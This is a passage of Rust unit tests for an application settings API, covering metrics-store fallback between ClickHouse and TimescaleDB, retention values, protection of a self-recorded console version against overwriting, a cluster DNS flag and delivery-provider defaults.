        settings.monitoring.store = MetricsStoreKind::ClickHouse;
        let configured_monitoring = settings.monitoring.clone();
        let configured_compression = settings.observability_compression.clone();
        let configured_proxy_retention = settings.observability_retention.proxy_logs_days;
        let configured_span_retention = settings.observability_retention.otel_spans_days;
        let configured_metric_retention = settings.observability_retention.otel_metrics_days;

        let response = AppSettingsResponse::from(settings)
            .with_effective_store(true)
            .with_effective_timescale_state(
                EffectiveTelemetryPolicies {
                    metrics_raw_days: Some(1),
                    proxy_logs_compression_hours: Some(1),
                    otel_spans_compression_hours: Some(1),
                    proxy_logs_retention_days: Some(1),
                    otel_spans_retention_days: Some(1),
                    otel_logs_retention_days: Some(45),
                    otel_metrics_retention_days: Some(60),
                    ..Default::default()
                },
                Some(3),
            );

        assert_eq!(
            response.monitoring.retention_raw_days,
            configured_monitoring.retention_raw_days
        );
        assert_eq!(
            response.monitoring.retention_hourly_days,
            configured_monitoring.retention_hourly_days
        );
        assert_eq!(
            response.monitoring.retention_daily_years,
            configured_monitoring.retention_daily_years
        );
        assert_eq!(response.observability_compression, configured_compression);
        assert_eq!(
            response.observability_retention.proxy_logs_days,
            configured_proxy_retention
        );
        assert_eq!(
            response.observability_retention.otel_spans_days,
            configured_span_retention
        );
        assert_eq!(response.observability_retention.otel_logs_days, 45);
        assert_eq!(
            response.observability_retention.otel_metrics_days,
            configured_metric_retention
        );
        assert_eq!(response.monitored_services_count, Some(3));
    }

    // The effective metrics store reconciles the `store` toggle with the
    // server's ClickHouse env-var state, mirroring `build_ch_metrics_store`.
    #[test]
    fn effective_store_reflects_runtime_clickhouse_availability() {
        // store=click_house but env vars NOT configured → runtime uses Timescale.
        let mut settings = AppSettings::default();
        settings.monitoring.store = MetricsStoreKind::ClickHouse;
        let response = AppSettingsResponse::from(settings.clone()).with_effective_store(false);
        assert_eq!(response.monitoring.store, MetricsStoreKind::ClickHouse);
        assert_eq!(
            response.effective_metrics_store,
            MetricsStoreKind::TimescaleDb,
            "ClickHouse selected but env vars unset must fall back to TimescaleDB"
        );
        assert_eq!(
            response.effective_observability_store,
            MetricsStoreKind::TimescaleDb
        );

        // store=click_house AND env vars configured → runtime uses ClickHouse.
        let response = AppSettingsResponse::from(settings).with_effective_store(true);
        assert_eq!(
            response.effective_metrics_store,
            MetricsStoreKind::ClickHouse
        );
        assert_eq!(
            response.effective_observability_store,
            MetricsStoreKind::ClickHouse
        );

        // store=timescale_db → always TimescaleDB, regardless of env vars.
        let response = AppSettingsResponse::from(AppSettings::default()).with_effective_store(true);
        assert_eq!(
            response.effective_metrics_store,
            MetricsStoreKind::TimescaleDb
        );
        assert_eq!(
            response.effective_observability_store,
            MetricsStoreKind::ClickHouse,
            "proxy logs and spans use ClickHouse whenever its server config is available"
        );
    }

    // ADR-017 Phase 3: `console_version` is self-recorded by a starting console
    // and must never be writable via the public PUT /settings API. The GET
    // response strips it, so a normal UI round-trip sends no value — without the
    // preserve step that would wipe the stored version (degrading skew
    // detection), and a crafted body could spoof it.
    #[test]
    fn update_preserves_console_version_when_payload_omits_it() {
        // Simulates the common UI round-trip: GET (no console_version) then PUT.
        let mut incoming = AppSettings::default();
        assert_eq!(incoming.console_version, None);

        let current = AppSettings {
            console_version: Some("v0.1.0".into()),
            ..Default::default()
        };

        preserve_self_recorded_fields(&mut incoming, &current);
        assert_eq!(
            incoming.console_version.as_deref(),
            Some("v0.1.0"),
            "an omitted console_version must be restored from the DB, not wiped"
        );
    }

    #[test]
    fn update_rejects_attempt_to_overwrite_console_version() {
        // An operator (or crafted client) tries to spoof the recorded version.
        let mut incoming = AppSettings {
            console_version: Some("v9.9.9-spoofed".into()),
            ..Default::default()
        };
        let current = AppSettings {
            console_version: Some("v0.1.0".into()),
            ..Default::default()
        };

        preserve_self_recorded_fields(&mut incoming, &current);
        assert_eq!(
            incoming.console_version.as_deref(),
            Some("v0.1.0"),
            "the API must not be able to overwrite the self-recorded console_version"
        );
    }

    // ADR-024: cluster_dns must be visible in the GET /settings response so
    // operators can read and toggle the feature flag. No masking — it's a
    // plain bool with no sensitive content.
    #[test]
    fn response_surfaces_cluster_dns_disabled_by_default() {
        let settings = AppSettings::default();
        let response = AppSettingsResponse::from(settings);
        assert!(
            !response.cluster_dns.enabled,
            "cluster_dns.enabled must be false in the default response"
        );
    }

    #[test]
    fn response_surfaces_cluster_dns_when_enabled() {
        let mut settings = AppSettings::default();
        settings.cluster_dns.enabled = true;
        let response = AppSettingsResponse::from(settings);
        assert!(
            response.cluster_dns.enabled,
            "cluster_dns.enabled=true must survive the AppSettings->AppSettingsResponse conversion"
        );
        // Confirm it serializes into the JSON response body
        let json = serde_json::to_string(&response).expect("serialize response");
        assert!(
            json.contains("\"cluster_dns\""),
            "cluster_dns must appear in the settings response JSON"
        );
        assert!(json.contains("\"enabled\":true"));
    }

    // The precondition that makes the preserve step necessary: the GET response
    // never carries console_version, so the field cannot round-trip from a
    // client and would default to None on any PUT.
    #[test]
    fn response_never_exposes_console_version() {
        let settings = AppSettings {
            console_version: Some("v0.1.0".into()),
            ..Default::default()
        };
        let json = serde_json::to_string(&AppSettingsResponse::from(settings))
            .expect("serialize response");
        assert!(
            !json.contains("console_version"),
            "console_version must not appear in the settings response"
        );
        assert!(!json.contains("v0.1.0"));
    }

    #[test]
    fn only_off_to_on_delivery_defaults_are_checked_for_availability() {
        let off = AppSettings::default();
        let cloudflare_on = AppSettings {
            cloudflare_new_projects: true,
            ..Default::default()
        };
        let bunny_on = AppSettings {
            bunny_new_projects: true,
            ..Default::default()
        };
        assert_eq!(
            newly_enabled_delivery_defaults(&off, &cloudflare_on),
            vec!["cloudflare"]
        );
        assert_eq!(
            newly_enabled_delivery_defaults(&off, &bunny_on),
            vec!["bunny"]
        );
        assert_eq!(
            newly_enabled_delivery_defaults(&cloudflare_on, &bunny_on),
            vec!["bunny"]
        );
        // An unrelated save that keeps a stored default unchanged is not
        // re-validated, nor is switching a default off.
        assert!(newly_enabled_delivery_defaults(&cloudflare_on, &cloudflare_on).is_empty());
        assert!(newly_enabled_delivery_defaults(&bunny_on, &off).is_empty());
    }

    #[test]
    fn one_future_project_delivery_provider_is_allowed() {
        let mut settings = AppSettings::default();
        assert!(!conflicting_delivery_defaults(&settings));
        settings.cloudflare_new_projects = true;
        assert!(!conflicting_delivery_defaults(&settings));
        settings.bunny_new_projects = true;
        assert!(conflicting_delivery_defaults(&settings));
        settings.cloudflare_new_projects = false;
        assert!(!conflicting_delivery_defaults(&settings));
    }
}
